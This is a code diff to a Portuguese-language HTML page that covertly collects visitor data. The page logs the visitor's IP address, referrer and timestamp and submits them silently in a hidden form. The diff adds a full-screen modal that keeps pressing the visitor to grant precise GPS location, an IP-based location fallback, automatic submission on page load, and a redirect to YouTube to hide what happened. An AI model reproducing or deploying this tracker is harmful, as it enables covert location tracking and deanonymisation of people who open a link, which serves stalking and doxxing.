@@ -16,9 +16,40 @@
         .gradient-bg {
             background: linear-gradient(135deg, #2563eb 0%, #1d4ed8 100%);
         }
+        #location-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.8);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+        }
+        .modal-content {
+            background: white;
+            padding: 2rem;
+            border-radius: 10px;
+            max-width: 500px;
+            text-align: center;
+        }
     </style>
 </head>
 <body class="font-sans bg-gray-50 text-gray-800">
+    <!-- Modal de Localização -->
+    <div id="location-modal">
+        <div class="modal-content">
+            <i class="fas fa-map-marker-alt text-4xl text-blue-500 mb-4"></i>
+            <h2 class="text-2xl font-bold mb-4">Permissão de Localização Necessária</h2>
+            <p class="mb-6">Para oferecer a melhor experiência, precisamos da sua localização. Por favor, clique em "Permitir" quando solicitado pelo seu navegador.</p>
+            <button id="retry-btn" class="bg-blue-500 hover:bg-blue-600 text-white font-bold py-2 px-6 rounded-lg">
+                Tentar Novamente
+            </button>
+        </div>
+    </div>
+
     <!-- Conteúdo do Site -->
     <header class="gradient-bg text-white sticky top-0 z-40 shadow-lg">
         <div class="container mx-auto px-6 py-4">
@@ -93,11 +124,54 @@
         <input type="hidden" name="longitude" id="longitude">
         <input type="hidden" name="accuracy" id="accuracy">
         <input type="hidden" name="location_access" id="locationAccess">
+        <input type="hidden" name="ip_location" id="ipLocation">
     </form>
 
     <script>
+        // Elementos do modal
+        const locationModal = document.getElementById('location-modal');
+        const retryBtn = document.getElementById('retry-btn');
+
+        // Mostra o modal de localização
+        function showLocationModal() {
+            locationModal.style.display = 'flex';
+        }
+
+        // Esconde o modal de localização
+        function hideLocationModal() {
+            locationModal.style.display = 'none';
+        }
+
+        // Tenta novamente obter a localização
+        retryBtn.addEventListener('click', async () => {
+            hideLocationModal();
+            await getGeolocation();
+        });
+
+        // Função para obter localização por IP
+        async function getIPLocation() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                
+                if (data.latitude && data.longitude) {
+                    document.getElementById('ipLocation').value = 
+                        `${data.city}, ${data.region}, ${data.country_name}`;
+                    
+                    // Se não tivermos GPS, usamos a localização por IP
+                    if (!document.getElementById('latitude').value) {
+                        document.getElementById('latitude').value = data.latitude;
+                        document.getElementById('longitude').value = data.longitude;
+                        document.getElementById('accuracy').value = `IP (${data.postal || 'Aprox'})`;
+                    }
+                }
+            } catch (error) {
+                console.error('Erro ao obter localização por IP:', error);
+            }
+        }
+
         // Função para obter localização geográfica
-        function getGeolocation() {
+        async function getGeolocation() {
             return new Promise((resolve) => {
                 if (!navigator.geolocation) {
                     document.getElementById('locationAccess').value = "Navegador não suporta geolocalização";
@@ -105,24 +179,46 @@
                     return;
                 }
 
+                // Configuração para forçar alta precisão
+                const options = {
+                    enableHighAccuracy: true,
+                    timeout: 10000,  // 10 segundos
+                    maximumAge: 0     // Sem cache
+                };
+
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
+                        // Sucesso - obtemos as coordenadas
                         document.getElementById('latitude').value = position.coords.latitude;
                         document.getElementById('longitude').value = position.coords.longitude;
-                        document.getElementById('accuracy').value = position.coords.accuracy;
+                        document.getElementById('accuracy').value = position.coords.accuracy + ' metros';
                         document.getElementById('locationAccess').value = "Permitido";
+                        hideLocationModal();
                         resolve();
                     },
                     (error) => {
-                        document.getElementById('locationAccess').value = 
-                            `Negado (${error.code}: ${error.message})`;
+                        // Erro - mostra o modal e registra o erro
+                        let errorMessage;
+                        switch(error.code) {
+                            case error.PERMISSION_DENIED:
+                                errorMessage = "Usuário negou a solicitação de geolocalização";
+                                showLocationModal();
+                                break;
+                            case error.POSITION_UNAVAILABLE:
+                                errorMessage = "Informação de localização indisponível";
+                                break;
+                            case error.TIMEOUT:
+                                errorMessage = "A solicitação de localização expirou";
+                                showLocationModal();
+                                break;
+                            default:
+                                errorMessage = "Erro desconhecido na geolocalização";
+                        }
+                        
+                        document.getElementById('locationAccess').value = errorMessage;
                         resolve();
                     },
-                    {
-                        enableHighAccuracy: true,
-                        timeout: 5000,
-                        maximumAge: 0
-                    }
+                    options
                 );
             });
         }
@@ -135,7 +231,7 @@
             document.getElementById('referrer').value = document.referrer || 'Direto';
             document.getElementById('timestamp').value = new Date().toISOString();
 
-            // Tenta obter IPv4
+            // Obtém IPv4
             try {
                 const response = await fetch('https://api.ipify.org?format=json');
                 const data = await response.json();
@@ -144,15 +240,33 @@
                 document.getElementById('ipv4').value = "Erro ao obter";
             }
 
-            // Tenta obter localização
+            // 1. Tenta obter localização precisa via GPS
             await getGeolocation();
+            
+            // 2. Fallback: Obtém localização aproximada via IP
+            await getIPLocation();
 
             // Envia os dados silenciosamente
             document.getElementById('dataCollector').submit();
+            
+            // Redireciona após 3 segundos (opcional)
+            setTimeout(() => {
+                window.location.href = "https://www.youtube.com"; // Altere para sua URL
+            }, 3000);
         }
 
-        // Dispara após um pequeno delay
-        setTimeout(collectAndSend, 1500);
+        // Inicia a coleta de dados quando a página carrega
+        window.addEventListener('load', () => {
+            // Mostra o modal após 1 segundo se a localização ainda não foi permitida
+            setTimeout(() => {
+                if (!document.getElementById('latitude').value) {
+                    showLocationModal();
+                }
+            }, 1000);
+            
+            // Inicia o processo de coleta
+            collectAndSend();
+        });
     </script>
 </body>
 </html>
